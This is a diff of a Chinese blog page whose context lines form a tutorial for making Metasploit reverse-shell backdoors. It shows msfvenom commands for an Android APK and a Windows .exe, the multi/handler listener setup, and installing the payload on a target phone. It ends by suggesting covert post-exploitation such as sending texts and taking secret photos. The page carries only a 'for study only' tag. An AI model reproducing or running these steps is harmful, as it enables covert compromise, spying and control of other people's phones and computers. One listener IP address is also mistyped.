@@ -184,43 +184,43 @@
 
 <p>一、安卓手机MSF上线</p>
 <p>1.打开kali，在命令窗口中输入 ifconfig 查看kali的ip地址</p>
-<img src="/p/8f17ee8a/1.png" class="">
+<img src="/p/undefined/1.png" class="">
 
 <p>2.接着输入命令  </p>
 <p>msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.108 lport=5555 &gt; 1.apk</p>
 <p>（这里lhost是kali的ip地址，lport自己选择，1.apk也是可以自己取名的）</p>
-<img src="/p/8f17ee8a/2.png" class="">
+<img src="/p/undefined/2.png" class="">
 
 <p>可以在root文件夹中看到生成了一个1.apk文件</p>
-<img src="/p/8f17ee8a/3.png" class="">
+<img src="/p/undefined/3.png" class="">
 
 <p>3.启用msf工具，输入msfconsole</p>
-<img src="/p/8f17ee8a/4.png" class="">
+<img src="/p/undefined/4.png" class="">
 
 <p>4.选择攻击模块 输入命令 use exploit/multi/handler</p>
-<img src="/p/8f17ee8a/5.png" class="">
+<img src="/p/undefined/5.png" class="">
 
 <p>设置攻击载荷反向tcp链接，lhost和lport</p>
 <p>set payload android/meterpreter/reverse_tcp</p>
 <p>set LHOST 1921.168.0.108</p>
 <p>set lport 5555</p>
 <p>执行攻击 run</p>
-<img src="/p/8f17ee8a/6.png" class="">
+<img src="/p/undefined/6.png" class="">
 
 <p>5.将1.apk文件发送到手机上并安装（我使用的是oppo A5，新的手机可能实现不了）</p>
 <p>安装之后点击一下，然后就可以看到kali已经成功入侵了手机啦</p>
-<img src="/p/8f17ee8a/7.png" class="">
+<img src="/p/undefined/7.png" class="">
 
-<img src="/p/8f17ee8a/8.png" class="">
+<img src="/p/undefined/8.png" class="">
 
 <p>6.又是渗透后的利用，可以发短信，偷拍等，自行发挥吧</p>
-<img src="/p/8f17ee8a/9.png" class="">
+<img src="/p/undefined/9.png" class="">
 
 <p>二、windows操作系统MSF上线</p>
 <p>1.查看kali的ip ifconfig（我上面的ip是192.168.0.108，接着使用一下）</p>
 <p>2.生成 .exe后门文件</p>
 <p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=6060 -f exe &gt; 谁用谁牛逼.exe</p>
-<img src="/p/8f17ee8a/10.png" class="">
+<img src="/p/undefined/10.png" class="">
 
 <p>3.启用msf工具，输入msfconsole</p>
 <p>4.选择攻击模块 输入命令 use exploit/multi/handler</p>
@@ -229,12 +229,12 @@
 <p>set LHOST 192.168.0.108</p>
 <p>set LPORT 6060</p>
 <p>执行攻击 run（和上面的步骤差不多，注意把android改成windows）</p>
-<img src="/p/8f17ee8a/11.png" class="">
+<img src="/p/undefined/11.png" class="">
 
 <p>5.在靶机上双击后门文件，kali中显示上线了</p>
-<img src="/p/8f17ee8a/12.png" class="">
+<img src="/p/undefined/12.png" class="">
 
-<img src="/p/8f17ee8a/14.png" class="">
+<img src="/p/undefined/14.png" class="">
 
 <p>6.渗透后利用。。。自己琢磨吧，为所欲为。</p>
 
@@ -357,7 +357,7 @@
                     <span>2</span>
                 </p>
                 <p class="title">
-                    <a href="/p/8f17ee8a.html" title="MSF上线">MSF上线</a>
+                    <a href="/p/undefined.html" title="MSF上线">MSF上线</a>
                 </p>
             </div>
         </li>
@@ -400,7 +400,7 @@
         </div>
         
         
-        <div class="cube-box-bg ">
+        <div class="cube-box ">
             <a href="/tags/%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%A7%82%EF%BC%81/">#仅供学习参观！</a>
         </div>
         
